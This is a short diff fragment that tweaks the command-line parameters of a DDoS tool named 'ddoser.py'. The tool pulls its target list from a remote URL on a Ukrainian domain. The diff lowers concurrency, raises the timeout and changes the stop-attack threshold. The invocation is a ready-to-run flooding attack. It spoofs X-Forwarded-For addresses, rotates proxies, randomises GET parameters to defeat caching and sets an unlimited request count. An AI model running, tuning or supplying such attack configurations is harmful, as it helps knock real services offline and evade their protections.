@@ -23,13 +23,13 @@ python3 ./ddoser.py \
 --target-urls-file 'https://xn--80aafyzixh.xn--j1amh/static/targets.txt' \
 --random-xff-ip \
 --shuffle-proxy \
---concurrency 150 \
+--concurrency 120 \
 --count 0 \
---timeout 20 \
+--timeout 60 \
 --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36' \
 --with-random-get-param \
 --restart-period 600 \
 --log-to-stdout \
---stop-attack 500 \
+--stop-attack 240 \
 --stop-attack-on-forbidden \
 -vv
